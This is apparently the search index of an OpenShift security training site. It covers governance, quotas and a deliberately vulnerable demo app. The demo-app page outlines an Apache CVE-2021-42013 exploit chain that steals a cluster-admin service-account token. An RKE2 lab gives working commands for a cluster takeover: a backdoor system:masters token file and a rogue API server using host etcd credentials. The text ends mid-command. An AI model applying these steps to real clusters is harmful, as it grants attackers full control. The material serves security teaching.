{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"OpenShift Security Use Cases","text":"<p>This repository provides a comprehensive walkthrough for implementing enterprise-grade security on OpenShift. To present a logical and high-impact story, the modules follow a Defense-in-Depth approach, layering defenses from infrastructure to runtime.</p>"},{"location":"#the-rhacs-demo-app","title":"The RHACS Demo App","text":"<p>This repository uses a purposely vulnerable application to demonstrate real-world attacks and defenses.</p> <ul> <li>RHACS Demo App: The RHACS Demo Application</li> <li>Goal: Understand the target application, its architecture, and how to deploy it for the hands-on labs.</li> </ul>"},{"location":"#the-cis-framework-small-quick-start","title":"The CIS Framework - Small Quick Start","text":"<p>Focus: Standards and Best Practices</p> <p>Adopting the Center for Internet Security (CIS) controls to build a data-driven security program and effective vulnerability management.</p> <ul> <li>Security Program: The CIS-Driven Security Operations Program</li> <li>Vulnerability Management: The CIS-Driven Vulnerability Management Program</li> <li>Goal: Align security operations with industry best practices and standards.</li> </ul>"},{"location":"#module-1-architecture-threats-security-strategy","title":"Module 1: Architecture, Threats &amp; Security Strategy","text":"<p>Focus: Foundation and Threat Modeling</p> <p>Before implementing controls, we must understand the architecture we are defending and the threats we face. This module sets the strategic baseline for the entire platform.</p> <ul> <li>Architecture &amp; Threat Awareness: OpenShift Security Architecture &amp; Threat Awareness</li> <li>Essential Controls: The 10 Essential Controls - A Unified Kubernetes Security Playbook</li> <li>Strategy: The 8 Pillars of a Secure Container Platform</li> <li>Business Context: The Risk-Driven Business Conversation</li> <li>Goal: Understand the \"Why\" and \"What\" of container security to effectively implement the \"How\".</li> </ul>"},{"location":"#module-2-secure-multi-tenancy-project-governance","title":"Module 2: Secure Multi-Tenancy &amp; Project Governance","text":"<p>Focus: Multi-tenancy and Day-0 Governance</p> <p>Before users onboard, we define the infrastructure standards. This module demonstrates how to automate the provisioning of secured environments so that security is a default property of the platform.</p> <ul> <li>Overview: Multi-Tenancy</li> <li>Hands-on Demo: Automated Project Provisioning</li> <li>Goal: Automatically provision isolated namespaces with embedded security guardrails using Custom Project Templates.</li> </ul>"},{"location":"#module-3-identity-and-access-management","title":"Module 3: Identity and Access Management","text":"<p>Focus: Authentication and Least Privilege</p> <p>Once the projects exist, we define who can enter them and what they are permitted to access.</p> <ul> <li>Overview: RBAC Fundamentals</li> <li>Advanced Case: Granular Custom Roles</li> <li>Goal: Use auth checks to demonstrate that a developer can manage their own applications but cannot access sensitive payment secrets or cluster-wide configurations.</li> </ul>"},{"location":"#module-4-admission-control-enforcement","title":"Module 4: Admission Control &amp; Enforcement","text":"<p>Focus: Resource Guardrails and Pod Security</p> <p>Show what happens when applications attempt to exceed their resource limits or bypass pod-level security constraints.</p> <ul> <li>Overview: IAM and Admission Control Overview</li> <li>Quotas: Resource Quotas</li> <li>Cluster-Wide Quotas: Cluster-Wide Quotas</li> <li>Limits: LimitRanges</li> <li>Security Context Constraints (SCC):<ul> <li>SCC Fundamentals</li> <li>SCC Defense in Depth - DAC &amp; MAC</li> <li>SCC Customization - Demo</li> </ul> </li> <li>Privileged Containers: The Real Danger of Privileged Containers</li> <li>Validating Admission Policy: Validating Admission Policy (VAP) Overview</li> <li>VAP Demo: Validating Admission Demo</li> <li>Goal: Prove the cluster's ability to self-enforce security by blocking privileged pods and automatically rightsizing deployments.</li> </ul>"},{"location":"#module-5-network-security-isolation","title":"Module 5: Network Security &amp; Isolation","text":"<p>Focus: Microservice Isolation</p> <p>Secure data in transit and prevent lateral movement between application tiers such as frontend, backend, and payments.</p> <ul> <li>NetworkPolicies Intro: Network Policies Intro</li> <li>NetworkPolicies - Demo: Network Policies - Demo</li> <li>AdminNetworkPolicies Intro: Admin Network Policies Intro</li> <li>AdminNetworkPolicies - Demo: AdminNetworkPolicies - Demo</li> <li>Goal: Use AdminNetworkPolicies to enforce global rules that remain immutable even if project owners attempt to override them.</li> </ul>"},{"location":"#module-6-compliance","title":"Module 6: Compliance","text":"<p>Focus: Continuous Monitoring and Vulnerability Management</p> <p>Verify that the cluster remains compliant over its entire lifecycle.</p> <ul> <li>Compliance Scan: Compliance Operator Demo</li> <li>Configuration: Compliance Operator Variables</li> <li>Goal: Scan against NIST/PCI-DSS standards and ensure continuous compliance posture.</li> </ul>"},{"location":"#module-7-incident-response-forensics","title":"Module 7: Incident Response &amp; Forensics","text":"<p>Focus: Post-Mortem Analysis</p> <p>The final stage covers how to react and investigate when a security event occurs.</p> <ul> <li>Audit Investigation: Mastering Audit Logs &amp; Forensics</li> <li>Visualizing History: Kubectl Timemachine</li> <li>Goal: Use forensic tools to search through audit logs and identify the specific actors behind unauthorized access or privilege escalation.</li> </ul>"},{"location":"#module-8-sovereign","title":"Module 8: Sovereign","text":"<p>Focus: Data Residency and Operational Autonomy</p> <p>Understanding the requirements and characteristics of Sovereign Cloud environments.</p> <ul> <li>Overview: Sovereign Cloud Overview</li> <li>Goal: Understand data residency, operational autonomy, and compliance with local regulations.</li> </ul>"},{"location":"demo_app/","title":"Demo App","text":""},{"location":"demo_app/#legal-disclaimer","title":"Legal Disclaimer","text":"<p>This project is done for educational and ethical testing purposes only. Attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.</p>"},{"location":"demo_app/#introduction","title":"Introduction","text":"<p>Welcome to our demo environment, where we showcase our comprehensive approach to securing modern application architectures. In this environment, we focus on critical areas of security: Applying Security Best practices ( Or not ), vulnerability management, runtime detection and response, network segmentation, defence in depth, and applying the least privileges. The demo environment also includes runtime detection and response capabilities, allowing you to detect and respond to threats in real time, including detecting zeroday attacks. Finally, our demo environment showcases the importance of network segmentation in securing modern application architectures.</p>"},{"location":"demo_app/#installing","title":"Installing","text":"<pre><code>git clone https://github.com/ralvares/security-demos\ncd demo_app/manifests\noc apply -k .\n</code></pre>"},{"location":"demo_app/#demo-diagram","title":"Demo Diagram","text":"<pre><code>flowchart LR\n    %% Define Styles\n    classDef frontend fill:#e8f5e9,stroke:#2e7d32,stroke-width:2px;\n    classDef backend fill:#e3f2fd,stroke:#1565c0,stroke-width:2px;\n    classDef payment fill:#fff3e0,stroke:#ef6c00,stroke-width:2px;\n    classDef ingress fill:#212121,stroke:#000,stroke-width:2px,color:#fff;\n\n    %% Nodes\n    Ingress((Ingress/Route)):::ingress\n\n    subgraph FE [Frontend Layer]\n        webapp[Web App]:::frontend\n        assetcache[Asset Cache]:::frontend\n        blog[Blog]:::frontend\n    end\n\n    subgraph BE [Backend Services]\n        reports[Reports]:::backend\n        recommendation[Recommendation]:::backend\n        checkout[Checkout]:::backend\n        shipping[Shipping]:::backend\n        catalog[Catalog]:::backend\n        notification[Notification]:::backend\n    end\n\n    subgraph PAY [Payment Gateway]\n        gateway{Gateway}:::payment\n        visaprocessor[Visa Processor]:::payment\n        mastercard[Mastercard Processor]:::payment\n    end\n\n    %% Connections\n    Ingress --&gt; webapp &amp; assetcache &amp; blog\n\n    webapp --&gt; reports &amp; checkout &amp; shipping &amp; recommendation\n\n    checkout --&gt; notification &amp; recommendation &amp; gateway\n\n    recommendation --&gt; catalog\n    reports --&gt; recommendation &amp; catalog\n\n    gateway --&gt; visaprocessor &amp; mastercard\n\n    %% Link Styling (Optional: makes lines lighter)\n    linkStyle default stroke:#9e9e9e,stroke-width:1px;</code></pre>"},{"location":"demo_app/#attack-description","title":"Attack Description","text":"<p>In this scenario, the attacker starts by gaining access to \"asset-cache,\" which may have a vulnerability that the attacker can exploit to gain control of the container. Once the attacker has control of \"asset-cache,\" they then use it as a jumping-off point to try and gain access to \"visa-processor.\"</p> <p>To do this, the attacker may use exploits or other techniques to move laterally within the network, potentially taking advantage of vulnerabilities in other containers or network components to gain access to additional systems. Once the attacker has gained access to \"visa-processor,\" they may attempt to establish persistence within the network, allowing them to maintain access even if their initial entry point is discovered and blocked.</p>"},{"location":"demo_app/#attack-flow","title":"Attack Flow","text":"<pre><code>flowchart LR\n    Attacker([Attacker])\n    Ingress[\"Ingress/Route\"]\n    AssetCache[\"asset-cache (Apache vuln)\"]\n    VisaProcessor[\"visa-processor (cluster-admin)\"]\n    Attacker--&gt;|Exploit|Ingress\n    Ingress--&gt;|Access|AssetCache\n    AssetCache--&gt;|Lateral Move|VisaProcessor</code></pre>"},{"location":"demo_app/#attack-environment","title":"Attack Environment","text":"<p>The \"asset-cache\" is a web server running a version of Apache with a vulnerability (CVE-2021-42013) and exposed to the internet via Route/ingress, which means it has a weakness that the attacker can exploit to gain access to the system.</p> <p>Remember that the vulnerability scanner cannot identify the vulnerability because the web server was built from source code, which means it was custom-made rather than downloaded as a pre-made package.</p> <p>The plan is to use the \"asset-cache\" as a stepping stone to access a workload called \"visa-processor\" that is running in the \"payments\" namespace.  There is no network segmentation within the cluster, which means that once they gain access to one part of the system, it will be relatively easy for them to move laterally and access other parts of the system.</p> <p>The \"visa-processor\" service account within the cluster has cluster-admin privileges. If the attacker has access to a token or credentials that allow them to authenticate with the Kubernetes cluster as the \"visa-processor\" service account (which has cluster-admin privileges), they would have significant power within the cluster.</p> <p>With this level of access, the attacker could use a command-line tool called \"kubectl\" to execute commands on any of the containers running within the cluster. For example, they could use the \"kubectl exec\" command to execute arbitrary commands on a running container, which could potentially give them access to sensitive information or allow them to modify the behaviour of the container in malicious ways.</p> <p>Alternatively, the attacker could use \"kubectl\" to create a new namespace within the cluster, and then deploy their own containers within that namespace. This would allow them to run their own code within the cluster, potentially giving them even greater access and control over the system.</p> <p>Overall, the level of access provided by the \"visa-processor\" service account within the Kubernetes cluster represents a significant security risk. Organizations must ensure appropriate security measures are in place to prevent unauthorized access.</p>"},{"location":"demo_app/#mitigations","title":"Mitigations","text":"<p>To mitigate the security risks outlined in the previous conversation, I would recommend starting with the following steps:</p> <ul> <li> <p>Upgrade the software running on the containers, including Apache and any other software that may be vulnerable to attack. Keeping software up-to-date is an essential step in ensuring that known security vulnerabilities are addressed.</p> </li> <li> <p>Apply the principle of least privilege to the \"visa-processor\" service account. Specifically, remove the cluster admin privileges from the service account and only provide it with the permissions that are required for it to perform its intended functions.</p> </li> <li> <p>configure the container to listen on a higher port, such as port 8080, so that it does not require root access. Running containers as non-root users is generally considered a best practice for security.</p> </li> <li> <p>Apply network policies to enforce network segmentation within the Kubernetes cluster. This can help prevent lateral movement by attackers who gain access to one part of the system.</p> </li> </ul>"},{"location":"demo_app/#generating-network-policies-using-roxctl","title":"Generating Network Policies using roxctl","text":"<p>Follow how simple is to create network policies using roxctl generate netpol  <pre><code>git clone https://github.com/ralvares/security-demos\ncd security-demos/demo_app/manifests\nroxctl netpol generate --dnspor=5353 . | oc apply -f -\n</code></pre></p> <p>By following these steps, organizations can reduce the likelihood of a successful attack against their Kubernetes cluster, and limit the damage that an attacker could cause if they were able to gain access to the system. It is important to keep in mind, however, that security is an ongoing process and requires regular attention and maintenance to stay effective.</p>"},{"location":"demo_app/#scripts","title":"Scripts","text":"<p>The scripts are designed to demo a few security use cases, meaning the target are hardcoded ( asset-cache and visa-processor ).</p> <ul> <li>01_expoit_asset-cache_get_visa_token.sh will use asset-cache as a steping stone to access the visa-processe service account token.</li> </ul> <pre><code>Security Demo -&gt; cd demo_app/attack\nSecurity Demo -&gt; ./01_expoit_asset-cache_get_visa_token.sh http://asset-cache-frontend.apps.&lt;CLUSTER.DOMAIN&gt;/                \n\u263a - Target asset-cache-84bc5779ff-lsq2n Exploited\n\u263a - Next Phase: Lateral Movement ...\n\u263a - Exploiting visa-processor workload ...\n\u263a - Target visa-processor-6d764fc488-qzjxl Exploited\n\u263a - Token extracted from visa-processor-6d764fc488-qzjxl\n \u2623\u2623\u2623 Checking Token Privileges \u2623\u2623\u2623\n\u263a - kubernetes.default.svc:443 Access Confirmed from asset-cache-84bc5779ff-lsq2n\n\u263a - Token with cluster-admin Privileges Confirmed\n\u2623\u2623\u2623 Happy Hacking \u2623\u2623\u2623\n\nSecurity Demo -&gt; cat token\neyJhbGciOiJSUzI1NiIsImtpZCI6ImNsbXFWcGppX1BQX1NHd....\n</code></pre>"},{"location":"sovereign/","title":"Sovereign Cloud Overview","text":"<p>A sovereign cloud is a cloud computing environment built to meet strict data sovereignty, privacy, and security laws, ensuring data and operations stay within specific national or regional boundaries, controlled by local entities or partners, to comply with regulations like GDPR and protect against foreign access, crucial for governments, finance, and healthcare.</p> <p>It offers features like data residency (physical location), operational autonomy, and customer-controlled encryption, combining public cloud innovation with localized governance for compliance and trust.</p>"},{"location":"sovereign/#key-characteristics","title":"Key Characteristics","text":"<ul> <li>Data Residency: Guarantees data, metadata, and logs remain within defined geographical borders, often on \"sovereign soil\".</li> <li>Legal &amp; Operational Control: Data is subject only to the laws of the country where it resides, with strong barriers against foreign government access.</li> <li>Local Management: Often involves local partners or separate legal entities (like EU citizens running EU clouds) for oversight and management.</li> <li>Enhanced Security: Incorporates features like customer-managed encryption keys (CMK) and Hardware Security Modules (HSMs) for greater control.</li> <li>Resilience: Can often operate in disconnected or air-gapped environments, ensuring business continuity.</li> </ul>"},{"location":"sovereign/#why-its-important","title":"Why It's Important","text":"<ul> <li>Regulatory Compliance: Helps meet complex data protection laws (e.g., EU's GDPR, DGA) in sensitive sectors.</li> <li>Trust &amp; Transparency: Builds customer and public trust by proving data is protected locally.</li> <li>Mitigates Risk: Protects against unauthorized data access by foreign entities, critical for national security and intellectual property.</li> </ul>"},{"location":"sovereign/#bridging-the-gap-how-cloud-native-platforms-power-sovereignty","title":"Bridging the Gap: How Cloud-Native Platforms Power Sovereignty","text":"<p>While a sovereign cloud provides the legal and physical framework, organizations still need a technological platform that can actually enforce these rules without sacrificing the agility of modern development. This is where an enterprise Kubernetes platform becomes the critical engine for sovereign deployments.</p>"},{"location":"sovereign/#1-true-technology-sovereignty-no-vendor-lock-in","title":"1. True Technology Sovereignty: No Vendor Lock-In","text":"<p>The foundation of a sovereign strategy is the ability to walk away from any single provider if regulations or geopolitical conditions change. Because these platforms are built on open-source Kubernetes, they act as a universal \"abstraction layer.\"</p> <ul> <li>Workload Portability: You can move your entire environment from a local service provider to your own on-premise data center without changing your code or operational processes.</li> <li>Open Standards: By using open-source software, you ensure that your critical infrastructure is transparent, auditable, and not tied to the proprietary roadmap of a foreign provider.</li> </ul>"},{"location":"sovereign/#2-operational-autonomy-in-air-gapped-environments","title":"2. Operational Autonomy in Air-Gapped Environments","text":"<p>For the most sensitive sectors like defense or national intelligence sovereignty often means total isolation from external networks.</p> <ul> <li>Disconnected Operations: The platform is designed to run in fully \"air-gapped\" environments. This means it can be installed, updated, and managed without ever connecting to the global internet.</li> <li>Local Control: By managing registries locally, you guarantee that no metadata or telemetry ever leave your sovereign borders, keeping your operational footprint invisible to outside entities.</li> </ul>"},{"location":"sovereign/#3-platform-control-and-consistency","title":"3. Platform Control and Consistency","text":"<p>Sovereign environments require predictable, controlled platform behavior.</p> <ul> <li>Defined Platform State: Cluster configuration is explicitly defined and managed.</li> <li>Centralized Management: Multi-cluster management tools provide consistent operational control across multiple clusters.</li> </ul>"},{"location":"sovereign/#4-advanced-security-and-encryption","title":"4. Advanced Security and Encryption","text":"<p>To protect against foreign access, the platform integrates deeply with local security hardware. It supports Customer Managed Keys (CMK) and Hardware Security Modules (HSMs), ensuring that even if the physical infrastructure is managed by a third party, the data remains encrypted and accessible only by the authorized local entity.</p>"},{"location":"acs-policy-as-code/","title":"Policies Overview","text":"<p>This directory contains example security policies for demonstration purposes.</p>"},{"location":"acs-policy-as-code/#log4shell-policy","title":"log4shell Policy","text":"<p>The <code>log4shell</code> policy is designed to identify known CVEs (Common Vulnerabilities and Exposures) in your workloads. For example, it can detect the presence of the Log4Shell vulnerability (CVE-2021-44228) in container images or application dependencies. This policy relies on vulnerability scanners to find and flag CVEs, helping you quickly identify and mitigate critical security issues.</p>"},{"location":"acs-policy-as-code/#httpd-server-version-policy","title":"httpd-server-version Policy","text":"<p>The <code>httpd-server-version</code> policy focuses on identifying risky components in your environment, even if a vulnerability scanner does not explicitly find a CVE. For example, it can detect the use of outdated or unsupported versions of the Apache HTTP server. By flagging the presence of such components, this policy helps you proactively manage risk, even when specific CVEs are not yet known or detected by scanners.</p> <p>Summary: - The <code>log4shell</code> policy identifies workloads with known CVEs. - The <code>httpd-server-version</code> policy identifies risky components, providing defense-in-depth even when CVEs are not detected.</p>"},{"location":"admissioncontrols/","title":"Identity and Access Management (IAM)","text":"<p>This section covers the fundamental concepts of Identity and Access Management (IAM) within the context of Kubernetes and OpenShift: Authentication (Authn), Authorization (AuthZ), and Admission Control.</p>"},{"location":"admissioncontrols/#authentication-authn","title":"Authentication (Authn)","text":"<p>\"Who is this?\"</p> <p>Authentication is the process of verifying a user's or device's identity. It ensures that the entity requesting access is who they claim to be.</p> <ul> <li>Example: A user providing a username and password, or a service account presenting a token to the API server.</li> <li>Note: In this demo environment, we will primarily focus on how authenticated identities are managed and restricted.</li> </ul>"},{"location":"admissioncontrols/#authorization-authz","title":"Authorization (AuthZ)","text":"<p>\"What are they allowed to do?\"</p> <p>Authorization determines what a verified identity is allowed to do or access within the system. This step occurs only after successful authentication.</p> <ul> <li>RBAC: Role-Based Access Control is the primary method for handling authorization in Kubernetes/OpenShift.</li> <li>For a deep dive into RBAC, please refer to the RBAC Session.</li> </ul>"},{"location":"admissioncontrols/#admission-control","title":"Admission Control","text":"<p>\"Does this request comply with policies?\"</p> <p>Admission Control is an additional layer of policy enforcement that intercepts requests to the Kubernetes API server. It acts as a final gatekeeper after the request has been authenticated and authorized, but before the object is persisted to etcd.</p> <p>Admission controllers can validate (accept/reject) or mutate (modify) requests.</p>"},{"location":"admissioncontrols/#default-admission-controls-in-openshift","title":"Default Admission Controls in OpenShift","text":"<p>OpenShift includes several default admission controllers to ensure cluster stability and security. Key examples include:</p>"},{"location":"admissioncontrols/#1-resource-quotas","title":"1. Resource Quotas","text":"<p>Resource Quotas provide constraints that limit the aggregate resource consumption per Namespace. They can limit the quantity of objects (e.g., number of Pods, Services) or the total amount of compute resources (e.g., CPU, Memory) that can be requested in that namespace.</p> <ul> <li>Purpose: Prevents a single team or project from consuming all available cluster resources.</li> </ul>"},{"location":"admissioncontrols/#2-limit-ranges","title":"2. Limit Ranges","text":"<p>Limit Ranges enumerate constraints on the resource allocation (limits and requests) for individual resources (like Pods or Containers) within a Namespace.</p> <ul> <li>Purpose: Enforces minimum and maximum CPU/Memory requests per pod, or ensures that users specify resource requests if they haven't done so (by applying defaults).</li> </ul>"},{"location":"admissioncontrols/#3-security-context-constraints-scc","title":"3. Security Context Constraints (SCC)","text":"<p>While often discussed under security, SCCs are enforced via admission control. They control the privileges that a pod can request, such as running as a privileged container, using host networking, or accessing the host filesystem.</p>"},{"location":"admissioncontrols/ClusterResourceQuota/","title":"Cluster-Wide Quotas","text":"<p>In a standard ResourceQuota, the limits are local to a single project. However, in an enterprise, you often want to grant a \"Total Budget\" to an entire department (e.g., the Finance Team) that spans across multiple projects (Development, Staging, Production).</p> <p>For this, we use the ClusterResourceQuota.</p>"},{"location":"admissioncontrols/ClusterResourceQuota/#demo-multi-project-governance-clusterresourcequota","title":"Demo: Multi-Project Governance (ClusterResourceQuota)","text":"<p>In this demo, we will create a global budget that follows a specific Label. Any project that carries the label <code>department: finance</code> will draw from this shared pool of resources.</p>"},{"location":"admissioncontrols/ClusterResourceQuota/#1-create-the-cluster-wide-budget","title":"1. Create the Cluster-Wide Budget","text":"<p>Unlike a local quota, a <code>ClusterResourceQuota</code> is a cluster-scoped object. We will define a limit of 10 CPUs and 20GB of RAM for the entire department.</p> <pre><code># Create the global budget tied to a label selector\ncat &lt;&lt;EOF &gt; finance-global-quota.json\n{\n  \"apiVersion\": \"quota.openshift.io/v1\",\n  \"kind\": \"ClusterResourceQuota\",\n  \"metadata\": {\n    \"name\": \"finance-department-quota\"\n  },\n  \"spec\": {\n    \"selector\": {\n      \"annotations\": null,\n      \"labels\": {\n        \"matchLabels\": {\n          \"department\": \"finance\"\n        }\n      }\n    },\n    \"quota\": {\n      \"hard\": {\n        \"cpu\": \"10\",\n        \"memory\": \"20Gi\"\n      }\n    }\n  }\n}\nEOF\n\n# Apply the global quota\noc create -f finance-global-quota.json\n</code></pre>"},{"location":"admissioncontrols/ClusterResourceQuota/#2-tag-the-projects","title":"2. Tag the Projects","text":"<p>Now, we create two separate projects and \"tag\" them as belonging to Finance.</p> <pre><code># Create Finance Project A\noc new-project finance-app-prod\noc label namespace finance-app-prod department=finance\n\n# Create Finance Project B\noc new-project finance-app-dev\noc label namespace finance-app-dev department=finance\n</code></pre>"},{"location":"admissioncontrols/ClusterResourceQuota/#3-verify-the-shared-consumption","title":"3. Verify the Shared Consumption","text":"<p>The power of this resource is the aggregated view. You can see exactly how much the entire department is using across all their projects.</p> <pre><code># View the aggregated usage\noc describe clusterresourcequota finance-department-quota\n</code></pre>"},{"location":"admissioncontrols/ClusterResourceQuota/#what-to-look-for","title":"What to look for:","text":"<ul> <li>Total Used: The sum of resources across both <code>finance-app-prod</code> and <code>finance-app-dev</code>.</li> <li>Project View: A breakdown of how much each specific project is contributing to that total.</li> </ul>"},{"location":"admissioncontrols/ClusterResourceQuota/#4-the-common-pot-scenario-verification","title":"4. The \"Common Pot\" Scenario (Verification)","text":"<p>If <code>finance-app-prod</code> consumes 18Gi of the 20Gi budget, <code>finance-app-dev</code> will only have 2Gi left, regardless of what its own local quotas might say.</p> <pre><code># Try to scale an app in the DEV project that exceeds the REMAINING department budget\noc run stress-test --image=nginx --requests='memory=5Gi' -n finance-app-dev\n</code></pre>"},{"location":"admissioncontrols/ClusterResourceQuota/#expected-result","title":"Expected Result:","text":"<p>The command will fail because the Department budget is exhausted, even if the Project itself looks empty.</p>"},{"location":"admissioncontrols/ClusterResourceQuota/#5-key-takeaways-for-the-audience","title":"5. Key Takeaways for the Audience","text":"<ul> <li>Departmental Accountability: You can give a team $10,000 worth of \"cloud credits\" (CPU/RAM) and let them decide how to distribute it among their different environments.</li> <li>Simplified Governance: Instead of managing 100 individual quotas, you manage one <code>ClusterResourceQuota</code> per department.</li> <li>Label-Based Automation: By simply labeling a new namespace, it is instantly brought under the umbrella of the department's financial and resource guardrails.</li> </ul>"},{"location":"admissioncontrols/ClusterResourceQuota/#6-cleanup","title":"6. Cleanup","text":"<pre><code>oc delete clusterresourcequota finance-department-quota\noc delete project finance-app-prod finance-app-dev\n</code></pre>"},{"location":"admissioncontrols/ShadowAPI-rke2/","title":"Lab: Shadow API Takeover on SUSE RKE2","text":"<p>This guide demonstrates how the \"Shadow API\" takeover is replicated on SUSE RKE2. While RKE2 is \"hardened by default,\" its security posture depends entirely on the selected installation profile.</p>"},{"location":"admissioncontrols/ShadowAPI-rke2/#the-default-vs-cis-trade-off","title":"The Default vs. CIS Trade-off","text":"<p>By default, RKE2 prioritizes usability, meaning it ships with a Pod Security Admission (PSA) level of <code>privileged</code>. Every namespace is wide open for exploitation by default.</p> <ul> <li>Default Profile: Enforces <code>privileged</code> globally. Any user with pod-creation rights can mount host paths and hijack the control plane.</li> <li>CIS Profile (<code>cis-1.x</code>): Enforces <code>restricted</code> globally. The attack below would be immediately blocked.</li> </ul>"},{"location":"admissioncontrols/ShadowAPI-rke2/#phase-0-infrastructure-setup-the-lab-environment","title":"Phase 0: Infrastructure Setup (The Lab Environment)","text":"<p>We use Lima on macOS to create an Ubuntu environment for RKE2.</p>"},{"location":"admissioncontrols/ShadowAPI-rke2/#1-create-the-ubuntu-vm","title":"1. Create the Ubuntu VM","text":"<pre><code># From your Mac Terminal\nbrew install lima\nlimactl start template://ubuntu --name=rke2-lab\nlimactl shell rke2-lab\n</code></pre>"},{"location":"admissioncontrols/ShadowAPI-rke2/#2-install-rke2","title":"2. Install RKE2","text":"<p>Inside the Lima shell, install and start the RKE2 server:</p> <pre><code>curl -sfL https://get.rke2.io | sudo sh -\nsudo systemctl enable rke2-server.service\nsudo systemctl start rke2-server.service\n\n# Link kubectl and fix config permissions\nsudo ln -s /var/lib/rancher/rke2/bin/kubectl /usr/local/bin/kubectl\nsudo chmod 644 /etc/rancher/rke2/rke2.yaml\nexport KUBECONFIG=/etc/rancher/rke2/rke2.yaml\necho 'export KUBECONFIG=/etc/rancher/rke2/rke2.yaml' &gt;&gt; ~/.bashrc\n</code></pre>"},{"location":"admissioncontrols/ShadowAPI-rke2/#3-check-global-rke2-configuration","title":"3. Check Global RKE2 Configuration","text":"<p>RKE2 stores its PSA defaults in a specific admission configuration file. You can see the global default by inspecting this file on the host.</p> <pre><code># Check the default PSA levels enforced by RKE2\nsudo cat /etc/rancher/rke2/rke2-pss.yaml\n</code></pre> <p>What to look for:</p> <ul> <li><code>privileged</code>: You are in the Default Profile. New namespaces will have no restrictions.</li> <li><code>restricted</code>: You are in the CIS Profile. The cluster is hardened.</li> </ul>"},{"location":"admissioncontrols/ShadowAPI-rke2/#4-provision-the-restricted-user-namespace","title":"4. Provision the Restricted User &amp; Namespace","text":"<p>We create a user (<code>dev-user</code>) and lock them into a single namespace (<code>dev-space</code>) with standard <code>edit</code> permissions.</p> <pre><code># Create the Workspace\nmkdir -p ~/users &amp;&amp; cd ~/users\n\n# Generate and Sign Certs\nopenssl genrsa -out dev-user.key 2048\nopenssl req -new -key dev-user.key -out dev-user.csr -subj \"/CN=dev-user\"\nsudo openssl x509 -req -in dev-user.csr -CA /var/lib/rancher/rke2/server/tls/client-ca.crt -CAkey /var/lib/rancher/rke2/server/tls/client-ca.key -CAcreateserial -out dev-user.crt -days 365\n\n# Create the restricted namespace and local RoleBinding\nkubectl create namespace dev-space\ncat &lt;&lt;EOF &gt; dev-user-local-binding.yaml\napiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: dev-user-restricted-binding\n  namespace: dev-space\nsubjects:\n- kind: User\n  name: dev-user\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: ClusterRole\n  name: edit\n  apiGroup: rbac.authorization.k8s.io\nEOF\nkubectl apply -f dev-user-local-binding.yaml\n\n# Generate the restricted Kubeconfig for the Attacker\nexport CLUSTER_CA=$(sudo cat /var/lib/rancher/rke2/server/tls/server-ca.crt | base64 -w 0)\nexport USER_CERT=$(cat dev-user.crt | base64 -w 0)\nexport USER_KEY=$(cat dev-user.key | base64 -w 0)\n\ncat &lt;&lt;EOF &gt; dev-user.config\napiVersion: v1\nkind: Config\nclusters:\n- cluster:\n    certificate-authority-data: ${CLUSTER_CA}\n    server: https://127.0.0.1:6443\n  name: rke2-local\ncontexts:\n- context:\n    cluster: rke2-local\n    namespace: dev-space\n    user: dev-user\n  name: dev-user-context\ncurrent-context: dev-user-context\nusers:\n- name: dev-user\n  user:\n    client-certificate-data: ${USER_CERT}\n    client-key-data: ${USER_KEY}\nEOF\n</code></pre>"},{"location":"admissioncontrols/ShadowAPI-rke2/#phase-1-dynamic-reconnaissance","title":"Phase 1: Dynamic Reconnaissance","text":"<p>The attacker (<code>dev-user</code>) identifies the cluster version and node info to prepare the payload.</p> <pre><code># 1. Format the RKE2 Image name (Fixes the versioning plus-sign issue)\nexport RAW_VERSION=$(kubectl --kubeconfig=dev-user.config version | grep 'Server Version' | awk '{print $3}')\nexport CLEAN_VERSION=$(echo $RAW_VERSION | sed 's/+/ /g' | awk '{print $1\"-\"$2}')\nexport API_IMAGE=\"rancher/hardened-kubernetes:${CLEAN_VERSION}-build20251210\"\n\n# 2. Deploy a probe pod to find the Service Range\nkubectl --kubeconfig=dev-user.config run probe-pod --image=nginx -n dev-space\nkubectl --kubeconfig=dev-user.config wait --for=condition=Ready pod/probe-pod --timeout=60s\n\nexport SVC_IP=$(kubectl --kubeconfig=dev-user.config exec probe-pod -n dev-space -- printenv KUBERNETES_SERVICE_HOST)\nexport SERVICE_RANGE=$(echo $SVC_IP | awk -F. '{print $1\".\"$2\".0.0/16\"}')\n\n# 3. Identify Node Info via Pod Status (RBAC bypass for \"get nodes\")\nexport HOST_NAME=$(kubectl --kubeconfig=dev-user.config get pod probe-pod -n dev-space -o jsonpath='{.spec.nodeName}')\nexport HOST_IP=$(kubectl --kubeconfig=dev-user.config get pod probe-pod -n dev-space -o jsonpath='{.status.hostIP}')\n</code></pre>"},{"location":"admissioncontrols/ShadowAPI-rke2/#phase-2-deploy-the-shadow-api","title":"Phase 2: Deploy the Shadow API","text":"<p>The attacker exploits the Privileged PSA to mount the host's master credentials.</p> <pre><code># 1. Create the Authentication Backdoor Token\ncat &lt;&lt;EOF | kubectl --kubeconfig=dev-user.config apply -n dev-space -f -\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: shadow-token-cm\ndata:\n  token-file.csv: |\n    shadow-token,shadow-admin,1000,\"system:masters\"\nEOF\n\n# 2. Launch the Shadow API Pod\ncat &lt;&lt;EOF | kubectl --kubeconfig=dev-user.config apply -n dev-space -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: rke2-shadow-api\n  namespace: dev-space\nspec:\n  nodeSelector:\n    kubernetes.io/hostname: ${HOST_NAME}\n  hostNetwork: true\n  containers:\n  - name: shadow-api\n    image: $API_IMAGE\n    command: [\"kube-apiserver\"]\n    args:\n      - \"--etcd-servers=https://127.0.0.1:2379\"\n      - \"--etcd-cafile=/var/lib/rancher/rke2/server/tls/etcd/server-ca.crt\"\n      - \"--etcd-certfile=/var/lib/rancher/rke2/server/tls/etcd/client.crt\"\n      - \"--etcd-keyfile=/var/lib/rancher/rke2/server/tls/etcd/client.key\"\n      - \"--etcd-prefix=/registry\"\n      - \"--secure-port=16443\"\n      - \"--authorization-mode=AlwaysAllow\"\n      - \"--token-auth-file=/etc/shadow-token/token-file.csv\"\n      - 